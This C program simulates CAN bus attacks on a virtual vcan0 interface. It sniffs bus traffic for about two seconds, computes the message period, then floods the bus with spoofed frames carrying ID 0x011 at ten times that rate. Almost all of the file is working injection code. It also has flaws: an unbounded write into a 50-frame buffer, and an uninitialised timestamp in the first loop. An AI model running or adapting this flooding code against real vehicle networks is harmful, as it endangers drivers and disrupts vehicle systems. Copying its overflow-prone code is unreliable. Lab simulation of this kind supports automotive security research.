/* 2021.06.01 */
/* 模拟攻击，分别为：洪泛攻击(ID=0X00)；欺骗攻击()；重放攻击（） */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <linux/can.h>
#include <linux/can/raw.h>
#include <time.h>
#include <errno.h>
#include<sys/time.h>

void milliseconds_sleep(unsigned long mSec){
	struct timeval tv;
	tv.tv_sec=mSec/1000;
	tv.tv_usec=(mSec%1000)*1000;
	int err;
	do{
		err=select(0,NULL,NULL,NULL,&tv);
	}while(err<0 && errno==EINTR);
}

int main()
{
	int s, nbytes;
	struct sockaddr_can addr;
	struct ifreq ifr;
	struct can_frame frame;
	struct can_filter rfilter[1];
	s = socket(PF_CAN, SOCK_RAW, CAN_RAW);  //创建套接字
	strncpy(ifr.ifr_name, "vcan0",IFNAMSIZ - 1 );
	ifr.ifr_name[IFNAMSIZ - 1] = '\0';

	ioctl(s, SIOCGIFINDEX, &ifr);     //指定can0设备
	ifr.ifr_ifindex = if_nametoindex(ifr.ifr_name);
	if (!ifr.ifr_ifindex) {
		perror("if_nametoindex");
		return 1;
	}

	printf("begin bind");
	memset(&addr, 0, sizeof(addr));
	addr.can_family = AF_CAN;
	addr.can_ifindex = ifr.ifr_ifindex;
	bind(s, (struct sockaddr *)&addr, sizeof(addr));   //将套接字与can0绑定
	printf("end of bind \n");

	/* 时间字符串 */
	int l = 0;
	char timestamp[128];
	struct timeval start;
	struct timeval end;
	gettimeofday(&start, NULL);
	strftime(timestamp, 128, "%X", localtime(&start.tv_sec));

	l = strlen(timestamp);
	sprintf(timestamp+l, ".%03ld", start.tv_usec/1000);

	int i=0;
	struct can_frame framebuffer[50]; 
//	nbytes = read(s, &framebuffer[i], sizeof(framebuffer[i]));   //接收报文
//	if (nbytes > 0) {
//		printf("timestamp=%s ID=0x%x DLC=%d data[0]=0x%x num=%d\n",timestamp, framebuffer[i].can_id, framebuffer[i].can_dlc, framebuffer[i].data[0],i);
//	}

	float time_use=0; 

/* 	gettimeofday(&end,NULL);
	time_use=(end.tv_sec-start.tv_sec);
	printf("time_use is %f\n",time_use); */

	// 模拟 攻击者保存 3秒 内总线上的信息，并分析数据来模拟发起攻击
	while(time_use <=2){
		i+=1;
		strftime(timestamp, 128, "%X", localtime(&end.tv_sec));
		l = strlen(timestamp);
		sprintf(timestamp+l, ".%03ld", end.tv_usec/1000);
		nbytes = read(s, &framebuffer[i], sizeof(framebuffer[i]));   //接收报文

		gettimeofday(&end,NULL);
		time_use=(end.tv_sec-start.tv_sec);

		if (nbytes > 0) {
			printf("timestamp=%s ID=0x%x DLC=%d data[0]=0x%x num=%d\n",timestamp, framebuffer[i].can_id, framebuffer[i].can_dlc, framebuffer[i].data[0],i);
		}
	}

	// 计算周期
	int total=0;
	total=(end.tv_sec-start.tv_sec)*1000+(end.tv_usec-start.tv_usec)/1000;
	float circle=total/(i+1);
	printf("circle is %f\n",circle);

	// 开始模拟持续发送 2s 消息
	while(time_use<=4){
		frame.can_id = 0x011;
		frame. can_dlc = 2;
		frame.data[0] = 0XEA;

		nbytes = write(s, &frame, sizeof(frame)); 
		printf("send messages successed!\n");
		if (nbytes != sizeof(frame)) {
			printf("Send Error frame[0]\n!");
		}
		gettimeofday(&end,NULL);
		time_use=(end.tv_sec-start.tv_sec);

		// 攻击者发送消息的频率 应该比正常ID快。
		milliseconds_sleep(circle/10);
	}
	close(s);
	return 0;
}